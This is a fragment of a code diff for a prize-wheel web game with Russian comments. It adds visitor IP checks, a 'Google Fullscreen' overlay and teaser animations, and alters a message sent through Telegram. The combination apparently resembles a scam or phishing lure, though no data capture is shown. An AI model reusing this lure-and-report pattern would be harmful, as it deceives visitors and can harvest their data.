-                            text: finalMessage,
+                            text: message,
                             parse_mode: 'HTML'
                         })
                     });
@@ -2999,6 +3951,12 @@
             selectionIndicator.style.opacity = '0';
             updatePrizeBadge();
             
+            // Проверяем, играл ли пользователь уже
+            if (hasPlayed && userIP !== ownerIP) {
+                playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
+                playBtn.disabled = false;
+            }
+            
             // Закрытие окна приза при клике на кнопку "Закрыть"
             collectPrizeBtn.addEventListener('click', closePrizeWindow);
             
@@ -3006,6 +3964,13 @@
             document.getElementById('prizeWindow').addEventListener('click', function(e) {
                 if (e.target === this) {
                     closePrizeWindow();
+                }
+            });
+            
+            // Закрытие Google Fullscreen при клике вне его
+            googleFullscreen.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    closeGoogleFullscreen();
                 }
             });
             
@@ -3036,10 +4001,14 @@
             
             preloadImages();
             
-            // Закрытие выпадающего меню при клике вне его
+            // Закрытие выпадающих меню при клике вне их
             document.addEventListener('click', function(event) {
                 if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
                     languageDropdown.classList.remove('show');
+                }
+                
+                if (!menuBtn.contains(event.target) && !dropdownMenu.contains(event.target)) {
+                    dropdownMenu.classList.remove('show');
                 }
             });
             
@@ -3052,6 +4021,32 @@
                     }
                 });
             });
+            
+            // Закрытие Google Fullscreen по Escape
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && googleFullscreen.classList.contains('active')) {
+                    closeGoogleFullscreen();
+                }
+            });
+            
+            // Автоматическая анимация рамки до начала игры
+            function animateFrameRandomly() {
+                if (!isSpinning && !hasPlayed) {
+                    const randomIndex = Math.floor(Math.random() * prizeItems.length);
+                    moveFrameToPrize(randomIndex);
+                    
+                    // Рандомный интервал для следующей анимации
+                    const nextDelay = Math.random() * 2000 + 1000; // 1-3 секунды
+                    setTimeout(animateFrameRandomly, nextDelay);
+                }
+            }
+            
+            // Запускаем анимацию рамки через 2 секунды после загрузки
+            setTimeout(() => {
+                if (!isSpinning) {
+                    animateFrameRandomly();
+                }
+            }, 2000);
         });
     </script>
 </body>
